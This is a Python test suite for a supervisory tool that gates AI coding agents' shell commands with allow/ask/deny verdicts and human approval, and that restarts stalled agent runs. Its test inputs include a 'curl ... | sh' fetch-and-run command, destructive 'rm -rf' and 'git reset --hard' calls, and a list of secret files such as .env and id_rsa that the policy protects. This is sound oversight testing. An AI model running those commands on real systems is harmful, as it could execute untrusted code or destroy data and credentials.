"""Effect policy, decisions, durable dependencies and watchdog regressions."""
import argparse
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

import test_router as fixture
import watch_fixture
import agent_oversight as a
import godfather_safety as s
import godfather_policy as policy
import godfather_lifecycle as life
import godfather_mcp as mcp

ROOT = fixture.ROOT


class EffectTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name).resolve()
        self.env = dict(os.environ, XDG_CONFIG_HOME=str(self.root / 'config'), XDG_STATE_HOME=str(self.root / 'state'), AGENT_RUNS_DIR=str(self.root / 'runs'), PYTHONDONTWRITEBYTECODE='1')
        self.patch = mock.patch.dict(os.environ, self.env, clear=True)
        self.patch.start()
        self.addCleanup(self.patch.stop)
        (self.root / 'runs').mkdir()
        self.base = self.root / 'runs/task'
        s.atomic(str(self.base) + '.run.json', dict(name='task', cli='codex', status='running', cwd='/work/task', started_at=a.now(), launcher_pid=os.getpid()))
        self.context = dict(cwd='/work/task', base=str(self.base), scratch=['/scratch/session'])
        self.real = self.root / 'real-rm'
        self.real.write_text('#!/bin/sh\nprintf "EXECUTED\\n"\n')
        self.real.chmod(0o700)
        self.context.update(real={'rm': str(self.real), 'tee': '/usr/bin/tee', 'sh': '/bin/sh'})
        s.atomic(str(self.base) + '.safety.json', self.context)

    def evaluate(self, *argv, cwd='/work/task'):
        return policy.evaluate(list(argv), self.context, cwd=cwd)

    def command(self, *args):
        return subprocess.run([str(ROOT / 'bin/godfather')] + list(args), env=self.env, capture_output=True, text=True, timeout=10)

    def shim(self, *args, timeout='3'):
        script = 'import sys; sys.path.insert(0, ' + repr(str(ROOT / 'bin')) + '); from godfather_safety import shim; sys.exit(shim(' + repr(str(self.base)) + ', sys.argv.pop(1)))'
        return subprocess.Popen([sys.executable, '-c', script] + list(args), env=dict(self.env, GODFATHER_BASE=str(self.base), GODFATHER_SHIMS='enforce', ASK_TIMEOUT=timeout), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    def pending(self):
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline:
            questions = s.control(self.base).get('questions', [])
            if questions and questions[-1].get('answer') is None:
                return questions[-1]
            time.sleep(.02)
        self.fail('no pending decision')

    def test_resolved_effects_and_roots(self):
        for argv in (('rm', '-rf', '/tmp/owned'), ('mv', 'old', 'new'), ('cp', '/etc/hosts', 'copy'), ('truncate', '-s', '0', 'file'), ('git', 'reset', '--hard'), ('git', 'restore', 'file'), ('git', 'clean', '-fd'), ('sh', '-c', 'echo hi > local')):
            self.assertEqual('allow', self.evaluate(*argv)['verdict'], argv)
        for argv in (('rm', '/elsewhere/file'), ('mv', '/elsewhere/source', 'local'), ('cp', 'local', '/elsewhere/dest'), ('git', '-C', '/elsewhere', 'reset', '--hard'), ('sh', '-c', 'echo hi > /elsewhere/output'), ('bash', '-c', 'curl https://example.invalid | sh'), ('sh', '-c', 'git push > local'), ('sh', '-c', 'git push; rm /tmp/a'), ('sh', '-c', 'cd /external; echo hi > out'), ('sh', '-c', 'echo hi > "$UNKNOWN_FILE"')):
            self.assertEqual('ask', self.evaluate(*argv)['verdict'], argv)
        link = self.root / 'escape'
        link.symlink_to('/elsewhere')
        self.assertEqual(['/elsewhere/file'], self.evaluate('rm', str(link / 'file'))['targets'])
        self.assertEqual('allow', self.evaluate('rm', '/scratch/session/test')['verdict'])
        self.assertEqual('ask', self.evaluate('rm', '/scratch/other/test')['verdict'])
        self.assertEqual('allow', self.evaluate('rm', str(self.base) + '.log')['verdict'])
        self.context['base'] = '/state/task'
        self.assertEqual('allow', self.evaluate('rm', '/state/task.log')['verdict'])
        self.assertEqual('ask', self.evaluate('rm', '/state/another.log')['verdict'])

    def test_secrets_and_self_cannot_be_overridden(self):
        for target in ('.env', '.env.local', 'id_rsa', 'private.pem', 'credentials.json', 'cert.key'):
            self.assertEqual('deny', self.evaluate('tee', target)['verdict'])
        self.assertEqual('deny', self.evaluate('bash', '-c', 'echo bad > .env.local')['verdict'])
        self.assertEqual('deny', self.evaluate('rm', str(ROOT / 'README.md'))['verdict'])
        self.context['self_allowed'] = True
        self.context['cwd'] = str(ROOT)
        self.assertEqual('allow', self.evaluate('rm', str(ROOT / 'README.md'))['verdict'])
        self.assertEqual('deny', self.evaluate('tee', str(ROOT / '.env'))['verdict'])

    def test_allow_deny_timeout_and_incidents(self):
        for answer in ('allow', 'deny', 'timeout'):
            with self.subTest(answer=answer):
                child = self.shim('rm', '/external/file', timeout='.2' if answer == 'timeout' else '5')
                try:
                    question = self.pending()
                    self.assertEqual(['/external/file'], question['effect']['targets'])
                    if answer != 'timeout':
                        result = self.command('answer', 'task', answer)
                        self.assertEqual(0, result.returncode, result.stderr)
                    out, err = child.communicate(timeout=5)
                    self.assertEqual(0 if answer == 'allow' else 126, child.returncode, err)
                    self.assertEqual(answer == 'allow', 'EXECUTED' in out)
                    if answer != 'allow':
                        self.assertIn(answer, err)
                finally:
                    if child.poll() is None:
                        child.kill(); child.communicate()
        records = list(life.lines(policy.state_dir() / 'incidents.jsonl'))
        self.assertTrue(all(set(('run', 'command', 'cwd', 'targets', 'verdict', 'answer', 'time')) <= set(v) for v in records))
        self.assertTrue(any(v['answer'] == 'timeout' for v in records))

    def test_piped_shell_requires_decision_even_without_outer_shell_shim(self):
        child = self.shim('sh')
        try:
            question = self.pending()
            self.assertIn('piped shell input', question['question'])
            result = self.command('answer', 'task', 'deny')
            self.assertEqual(0, result.returncode, result.stderr)
            out, error = child.communicate(input='echo should-not-execute', timeout=5)
            self.assertEqual(126, child.returncode, error)
            self.assertNotIn('should-not-execute', out)
        finally:
            if child.poll() is None:
                child.kill(); child.communicate()

    def test_remember_effective_sources_and_forget(self):
        child = self.shim('rm', '/external/file')
        try:
            self.pending()
            result = self.command('answer', 'task', 'allow', '--remember')
            self.assertEqual(0, result.returncode, result.stderr)
            out, err = child.communicate(timeout=5)
            self.assertEqual(0, child.returncode, err)
        finally:
            if child.poll() is None:
                child.kill(); child.communicate()
        learned = policy.config_dir() / 'policy.learned.toml'
        self.assertIn('# Approved from run task question', learned.read_text())
        rule = policy.document(learned.read_text())['rules'][0]
        child = self.shim('rm', '/external/file')
        out, err = child.communicate(timeout=5)
        self.assertEqual(0, child.returncode, err)
        self.assertIn('EXECUTED', out)
        self.assertIn('learned:', self.command('policy').stdout)
        self.assertEqual(0, self.command('policy', 'forget', rule['id']).returncode)
        self.assertEqual([], policy.load_policy()['rules'])

    def test_globs_copy_destinations_and_secret_read_only(self):
        work = self.root / 'workspace'
        work.mkdir()
        for name in ('a.txt', 'b.txt'):
            (work / name).write_text('test')
        target = self.evaluate('rm', str(work / '*.txt'))
        self.assertEqual(sorted(str(work / n) for n in ('a.txt', 'b.txt')), target['targets'])
        dest = work / 'dest'
        dest.mkdir()
        target = self.evaluate('cp', '-t', str(dest), str(work / 'a.txt'))
        self.assertIn(str(dest / 'a.txt'), target['targets'])
        self.assertNotIn(str(work / 'a.txt'), target['targets'])
        self.assertEqual('allow', self.evaluate('python3', '-c', "open('.env', 'r').read()")['verdict'])
        self.assertEqual('deny', self.evaluate('python3', '-c', "open('.env', 'w').write('x')")['verdict'])
        policy.config_dir().mkdir(parents=True, exist_ok=True)
        (policy.config_dir() / 'policy.toml').write_text(
            '[[outward]]\nbinary = "acme"\ncommands = ["apps"]\nread_only = ["list", "get", "retrieve", "logs", "help"]\npreview = true\n'
            '[[outward]]\nbinary = "acme"\ncommands = ["payouts", "transfers"]\n')
        for argv in (('rm', '-r', '/external/folder'), ('gh', '-R', 'org/repo', 'pr', 'merge', '1'), ('npm', '--registry', 'https://example.invalid', 'publish'), ('acme', 'payouts', 'create'), ('acme', 'apps', 'update', 'app_1'), ('vercel', 'deploy')):
            self.assertEqual('ask', self.evaluate(*argv)['verdict'], argv)
        self.assertEqual('allow', self.evaluate('acme', 'apps', 'deploy', '--preview')['verdict'])
        self.assertEqual('ask', self.evaluate('acme', 'payouts', 'create', '--preview')['verdict'])
        for argv in (('acme', 'apps', 'logs', 'app_1'), ('acme', 'payouts', 'list'), ('acme', 'apps'), ('acme', 'products', 'create')):
            self.assertEqual('allow', self.evaluate(*argv)['verdict'], argv)
        self.assertEqual('allow', self.evaluate('vercel', 'deploy', '--preview')['verdict'])

    def test_git_reset_resolves_repository_root_from_subdirectory(self):
        work = self.root / 'repo'
        work.mkdir()
        subprocess.run(['git', '-C', str(work), 'init', '-q'], check=True)
        subdir = work / 'subdir'
        subdir.mkdir()
        result = self.evaluate('git', '-C', str(subdir), 'reset', '--hard')
        self.assertIn(str(work), result['targets'])
        self.assertEqual([], self.evaluate('git', '-C', '/external', 'clean', '-nfd')['targets'])

    def test_secret_write_shim_returns_real_denial_without_touching_file(self):
        target = self.root / '.env.denied-test'
        child = self.shim('tee', str(target))
        out, error = child.communicate(input='never written', timeout=5)
        self.assertEqual(126, child.returncode, error)
        self.assertIn('Godfather DENY', error)
        self.assertFalse(target.exists())
        record = list(life.lines(policy.state_dir() / 'incidents.jsonl'))[-1]
        self.assertEqual('deny', record['verdict'])
        self.assertEqual([str(target)], record['targets'])

    def test_remember_is_limited_to_same_parent_flags_and_cwd(self):
        question = dict(id='reviewed', effect=dict(command=['rm', '-f', '/external/file'], targets=['/external/file'], cwd='/work/task'))
        policy.remember(question, self.base)
        self.assertEqual('allow', self.evaluate('rm', '-f', '/external/file-next')['verdict'])
        self.assertEqual('ask', self.evaluate('rm', '-rf', '/external/file-next')['verdict'])
        self.assertEqual('ask', self.evaluate('rm', '-f', '/external/sub/file')['verdict'])
        self.assertEqual('ask', self.evaluate('rm', '-f', '/other/file')['verdict'])
        self.assertEqual('ask', self.evaluate('rm', '-f', '/external/unrelated')['verdict'])
        self.assertEqual('ask', self.evaluate('rm', '-f', '/external/file-next', cwd='/different/cwd')['verdict'])
        self.assertEqual('deny', self.evaluate('rm', '-f', '/external/.env')['verdict'])

    def test_improve_launches_isolated_self_branch_with_check(self):
        with mock.patch.object(life.subprocess, 'call', return_value=0) as call:
            self.assertEqual(0, life.improve(argparse.Namespace(since='24h', dry_run=False)))
        argv = call.call_args.args[0]
        self.assertEqual(['run', '--self', '--isolate', '--check', './tests/smoke.sh'], argv[1:6])
        brief = Path(argv[6])
        self.assertIn('regression tests', brief.read_text())
        self.assertIn('doctor', brief.read_text())
        self.assertEqual(str(ROOT), call.call_args.kwargs['env']['CWD'])

    def test_reused_queued_name_does_not_report_old_route_done(self):
        base = self.root / 'runs/reused'
        s.atomic(str(base) + '.route.json', dict(run_id='old', status='finished', active_name='reused', started_at=time.time() - 10))
        s.atomic(str(base) + '.run.json', dict(name='reused', status='done'))
        job = life.queue_path('reused')
        job.parent.mkdir(parents=True, exist_ok=True)
        s.atomic(job, dict(status='running', created=time.time(), pid=os.getpid(), identity=a.processes()[os.getpid()]['identity']))
        self.assertEqual('queued', life.logical_status('reused'))

    def test_python38_config_parser_and_healing_defaults(self):
        text = '[healing]\nenabled = false\n[watch]\nignore = ["true false",\n"custom-noise"]\n'
        with mock.patch.dict(sys.modules, {'tomllib': None}):
            parsed = policy.document(text)
        self.assertFalse(parsed['healing']['enabled'])
        self.assertEqual(['true false', 'custom-noise'], parsed['watch']['ignore'])
        (policy.config_dir() / 'godfather.toml').parent.mkdir(parents=True, exist_ok=True)
        (policy.config_dir() / 'godfather.toml').write_text(text)
        settings, ignored = life.settings()
        self.assertFalse(settings['enabled'])
        self.assertEqual(900, settings['hard_limit_secs'])
        self.assertIn('custom-noise', ignored)

    def test_mcp_job_is_queued_before_first_route_file_exists(self):
        base = self.root / 'runs/not-started'
        s.atomic(str(base) + '.job.json', dict(run_id='new', pid=os.getpid(), identity=a.processes()[os.getpid()]['identity'], started_at=time.time()))
        status, timed_out = life.wait_run('not-started', 0)
        self.assertEqual(('queued', True), (status, timed_out))

    def test_doctor_and_improve_dry_run(self):
        policy.incident(self.base, ['rm', '/external/file'], '/work/task', ['/external/file'], 'ask', 'allow')
        s.event(self.base, 'HEALED', 'stream (interrupted)')
        s.event(self.base, 'ESCALATE', 'restart failed')
        s.event(self.base, 'STALL', 'quiet')
        result = self.command('doctor', '--since', '24h')
        self.assertEqual(0, result.returncode, result.stderr)
        for text in ('Heals: 1', 'escalations: 1', 'False-positive candidates', 'Recurring stalls by model', 'Suggestions:'):
            self.assertIn(text, result.stdout)
        result = self.command('improve', '--dry-run')
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertIn('Fix root causes with regression tests', result.stdout)
        self.assertFalse(list((self.root / 'runs').glob('*.route.json')))


class RecoveryTests(unittest.TestCase):
    setUp = fixture.RouterTests.setUp
    config_models = fixture.RouterTests.config_models
    launch = fixture.RouterTests.launch
    calls = fixture.RouterTests.calls

    def command(self, *args):
        # These recovery fixtures deliberately use the fake user's home as CWD.
        if args and args[0] == 'run':
            args = ('run', '--no-isolate', *args[1:])
        return subprocess.run([str(ROOT / 'bin/godfather')] + list(args), env=self.env, capture_output=True, text=True, timeout=25)

    def wait_for(self, check, timeout=15):
        end = time.monotonic() + timeout
        while time.monotonic() < end:
            if check():
                return
            time.sleep(.03)
        self.fail('condition not reached')

    def watch(self, *args):
        return subprocess.Popen([str(ROOT / 'bin/godfather'), 'watch', '--poll-secs', '.04'] + list(args), env=self.env, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def events(self, name='task'):
        return list(life.lines(self.root / ('runs/' + name + '.events.jsonl')))

    def test_stream_stall_heals_with_same_session_nudge(self):
        self.config_models(('codex', 'work'))
        code = fixture.FAKE.replace("if quota:\n", "if cli == 'codex' and 'resume' not in args:\n    import time\n    print('session id: 33333333-3333-3333-3333-333333333333', flush=True)\n    print('Error: stream was interrupted', file=sys.stderr, flush=True)\n    time.sleep(3)\nif quota:\n", 1)
        (self.root / 'fake/codex').write_text(code)
        child = subprocess.Popen([str(ROOT / 'bin/godfather'), 'run', '--no-isolate', '-p', 'small task', 'task'], env=self.env, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        watcher = self.watch('--stall-secs', '.25')
        try:
            self.wait_for(lambda: any(v['kind'] == 'HEALED' for v in self.events()))
            events = [(v['kind'], v.get('detail')) for v in self.events()]
            self.assertIn('Continue where you left off; write large files in pieces under ~400 lines.', self.calls()[-1]['prompt'], events)
            self.assertIn('resume', self.calls()[-1]['args'], events)
            self.assertFalse(any(kind == 'ESCALATE' for kind, _detail in events), events)
        finally:
            if child.poll() is None:
                child.terminate()
            child.communicate(timeout=10)
            watcher.terminate(); watcher.communicate(timeout=5)

    def test_quiet_stall_queues_nudge_then_restarts_stalled_resume_with_handoff(self):
        self.config_models(('codex', 'work'))
        code = fixture.FAKE.replace("if quota:\n", "if cli == 'codex' and 'Continue the task rather than restart' not in prompt:\n    import time\n    print('session id: 33333333-3333-3333-3333-333333333333', flush=True)\n    time.sleep(30 if 'resume' in args else 1.5)\n    if 'resume' in args:\n        (Path.home() / 'resume-finished-naturally').touch()\nif quota:\n", 1)
        (self.root / 'fake/codex').write_text(code)
        child = subprocess.Popen([str(ROOT / 'bin/godfather'), 'run', '--no-isolate', '-p', 'small task', 'task'], env=self.env, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        watcher = self.watch('--stall-secs', '.3')
        try:
            # Initial launch, queued resume, and restart each do real process
            # ownership checks. Allow that setup on a loaded host; the fake
            # resume still sleeps 30s and must be interrupted to pass.
            self.wait_for(lambda: any(v['kind'] == 'HEALED' and v['detail'].startswith('restart') for v in self.events()), timeout=45)
            calls = self.calls()
            self.assertIn('You appear stuck; report status, then continue.', calls[1]['prompt'])
            self.assertIn('Continue the task rather than restart', calls[-1]['prompt'])
            self.assertIn('small task', calls[-1]['prompt'])
            self.assertFalse((self.root / 'resume-finished-naturally').exists())
            state = s.read(self.root / 'runs/task.healing.json')
            self.assertEqual({'stall': 1, 'restart': 1}, state['attempts'])
        finally:
            if child.poll() is None:
                child.terminate()
            child.communicate(timeout=10)
            watcher.terminate(); watcher.communicate(timeout=5)

    def test_dead_process_restarts_once(self):
        self.config_models(('codex', 'work'))
        self.assertEqual(0, self.launch().returncode)
        path = self.root / 'runs/task.run.json'
        run = a.read(path)
        run.update(status='running', pid=999999999, launcher_pid=999999998, supervisor_pid=999999997,
                   exit_code=None, child_exit_code=None, ended_at=None)
        s.atomic(path, run)
        watcher = self.watch('--stall-secs', '.2')
        try:
            self.wait_for(lambda: any(v['kind'] == 'HEALED' and v['detail'].startswith('died') for v in self.events()))
            self.assertIn('Continue the task rather than restart', self.calls()[-1]['prompt'])
            latest = a.read(self.root / 'runs/task.route.json')['active_name']
            self.assertEqual(str(self.root), a.read(self.root / ('runs/' + latest + '.run.json'))['cwd'])
            with mock.patch.dict(os.environ, self.env, clear=True):
                self.assertFalse(life.request_heal(run, 'died', 'vanished again'))
                self.assertEqual('done', life.logical_status('task'))
        finally:
            watcher.terminate(); watcher.communicate(timeout=5)

    def test_important_and_no_replay(self):
        self.assert_important_and_no_replay()

    def test_important_and_no_replay_with_slow_startup(self):
        self.assert_important_and_no_replay(startup_delay=1)

    def assert_important_and_no_replay(self, startup_delay=0):
        self.config_models(('codex', 'work'))
        self.assertEqual(0, self.launch().returncode)
        base = self.root / 'runs/task'
        runs = base.parent
        s.event(base, 'DONE', 'old completion')
        command = [str(ROOT / 'bin/godfather'), 'watch', '--poll-secs', '.04', '--important', '--no-heal']
        watcher = watch_fixture.launch(command, self.env, startup_delay)
        try:
            subscriber = watch_fixture.leased(runs, watcher)
            # A filtered event proves the watcher has run; an empty pipe alone
            # could mean it has not started yet. Append after cursor creation.
            s.event(base, 'CHECK', 'pass (startup barrier)')
            watch_fixture.consumed(runs, watcher, subscriber, self.events()[-1]['seq'])
        finally:
            watcher.terminate()
            output, error = watcher.communicate(timeout=5)
        self.assertEqual(b'', output, error)
        watcher = watch_fixture.launch(command + ['--replay'], self.env, startup_delay)
        try:
            subscriber = watch_fixture.leased(runs, watcher)
            for kind, detail in [('ERROR', 'Failed to get cs path'), ('STALL', 'ordinary'), ('CHECK', 'pass'), ('CHECK', 'fail (round 0)'), ('NEEDS_INPUT', ': Approve?'), ('DENY', ': secret'), ('ESCALATE', 'failed'), ('HEALED', 'stream')]:
                s.event(base, kind, detail)
            # Wait until every event, including filtered ones, was consumed.
            watch_fixture.consumed(runs, watcher, subscriber, self.events()[-1]['seq'])
        finally:
            watcher.terminate()
            output, error = watcher.communicate(timeout=5)
        for kind in (b'CHECK task fail', b'NEEDS_INPUT', b'DENY', b'ESCALATE', b'DONE'):
            self.assertIn(kind, output, error)
        for kind in (b'ERROR', b'STALL', b'CHECK task pass', b'HEALED'):
            self.assertNotIn(kind, output)

    def test_wait_tracks_router_not_partial_segment_or_last_file(self):
        self.config_models(('codex', 'work'), ('grok', 'fallback'))
        code = fixture.FAKE.replace("if quota:\n", "if cli == 'grok':\n    import time\n    time.sleep(1)\nif quota:\n", 1)
        (self.root / 'fake/grok').write_text(code)
        child = subprocess.Popen([str(ROOT / 'bin/godfather'), 'run', '--no-isolate', '-p', 'task', 'task'], env=dict(self.env, QUOTA_MODELS='work'), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            self.wait_for(lambda: a.read(self.root / 'runs/task.run.json').get('status') == 'quota')
            self.assertTrue((self.root / 'runs/task.last.md').stat().st_size)
            result = self.command('wait', 'task', '--timeout', '.1')
            self.assertEqual(1, result.returncode)
            self.assertIn('timeout', result.stdout)
            result = self.command('wait', 'task', '--timeout', '10')
            self.assertEqual(0, result.returncode, result.stderr)
            self.assertIn('task done', result.stdout)
            with mock.patch.dict(os.environ, self.env, clear=True):
                self.assertEqual('done', mcp.call_tool('wait', dict(name='task', timeout_s=1))['status'])
        finally:
            child.communicate(timeout=15)

    def test_queue_dependencies_success_failure_any_and_status(self):
        self.config_models(('codex', 'work'))
        result = self.command('run', '--after', 'parent', '-p', 'dependent', 'child')
        self.assertEqual(0, self.launch('parent').returncode)
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertIn('QUEUED child', result.stdout)
        self.assertEqual(0, self.command('wait', 'child', '--timeout', '15').returncode)
        self.assertTrue(any(e['kind'] == 'START' for e in self.events('child')))
        path = self.root / 'runs/parent.run.json'
        run = a.read(path); run.update(status='failed', exit_code=1); s.atomic(path, run)
        self.assertEqual(0, self.command('run', '--after', 'parent', '-p', 'blocked', 'blocked').returncode)
        run.update(run_id='failed-parent', router_id='failed-parent', started_at=a.now())
        s.atomic(path, run)
        self.assertEqual(1, self.command('wait', 'blocked', '--timeout', '10').returncode)
        self.assertEqual(0, self.command('run', '--after-any', 'parent', '-p', 'any', 'any').returncode)
        run.update(run_id='another-failed-parent', router_id='another-failed-parent', started_at=a.now())
        s.atomic(path, run)
        self.assertEqual(0, self.command('wait', 'any', '--timeout', '15').returncode)

    def test_queue_waits_for_future_parent_registration_and_times_out_missing_names(self):
        self.config_models(('codex', 'work'))
        queued = self.command('run', '--after', 'future-parent', '-p', 'later', 'future-child')
        self.assertEqual(0, queued.returncode, queued.stderr)
        self.assertEqual(0, self.launch('future-parent').returncode)
        self.assertEqual(0, self.command('wait', 'future-child', '--timeout', '15').returncode)
        queued = self.command('run', '--after-any', 'never-registers', '--dependency-timeout', '.1', '-p', 'later', 'missing-child')
        self.assertEqual(0, queued.returncode, queued.stderr)
        timed = self.command('wait', 'missing-child', '--timeout', '5')
        self.assertEqual(1, timed.returncode)
        job = s.read(self.root / 'state/godfather/queue/missing-child.json')
        self.assertEqual('dependency_failed', job['status'])
        self.assertIn('never-registers', job['error'])

    def test_queue_persists_without_watcher_and_restarts_on_invocation(self):
        self.config_models(('codex', 'work'))
        self.assertEqual(0, self.launch('parent').returncode)
        result = subprocess.run([str(ROOT / 'bin/godfather'), 'run', '--no-isolate', '--after', 'parent', '-p', 'durable', 'durable'], env=dict(self.env, GODFATHER_QUEUE_DAEMON='1'), capture_output=True, text=True, timeout=10)
        self.assertEqual(0, result.returncode, result.stderr)
        path = self.root / 'state/godfather/queue/durable.json'
        self.assertEqual('queued', s.read(path)['status'])
        with mock.patch.dict(os.environ, self.env, clear=True):
            rows = a.snapshot(self.root / 'runs')
            self.assertEqual('queued', next(r for r in rows if r['name'] == 'durable')['status'])
        self.assertEqual(0, self.launch('parent').returncode)
        self.assertEqual(0, self.command('wait', 'durable', '--timeout', '15').returncode)

    def test_exhausted_preflight_emits_only_terminal_quota(self):
        self.config_models(('codex', 'work'))
        with mock.patch.dict(os.environ, self.env, clear=True):
            __import__('godfather_router').mark_exhausted('codex:work', 'quota exhausted')
        result = self.launch()
        self.assertNotEqual(0, result.returncode)
        self.assertTrue(any(e['kind'] == 'QUOTA' and 'no fallback' in e['detail'] for e in self.events()))
        with mock.patch.dict(os.environ, self.env, clear=True):
            self.assertEqual('quota', life.logical_status('task'))
            self.assertTrue(life.important('QUOTA', 'no fallback model remains', 'task'))

    def test_auth_retry_once_can_recover_without_fallback(self):
        self.config_models(('codex', 'work'))
        code = fixture.FAKE.replace("auth = os.getenv('TASK_AUTH_FAILURE') == cli", "auth = not (Path.home() / 'auth-retried').exists()\n(Path.home() / 'auth-retried').touch()")
        (self.root / 'fake/codex').write_text(code)
        result = self.launch()
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertEqual(2, len(self.calls()))
        self.assertTrue(any(e['kind'] == 'HEALED' and 'auth retry' in e['detail'] for e in self.events()))
        self.assertFalse(any(e['kind'] == 'ESCALATE' for e in self.events()))

    def test_wait_lock_blocks_then_starts(self):
        self.config_models(('codex', 'work'))
        with mock.patch.dict(os.environ, self.env, clear=True):
            with s.cwd_lock(self.root):
                child = subprocess.Popen([str(ROOT / 'bin/godfather'), 'run', '--no-isolate', '--wait-lock', '-p', 'task', 'task'], env=self.env, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(.3)
                self.assertIsNone(child.poll())
                self.assertFalse((self.root / 'calls.jsonl').exists())
            out, err = child.communicate(timeout=15)
            self.assertEqual(0, child.returncode, err)
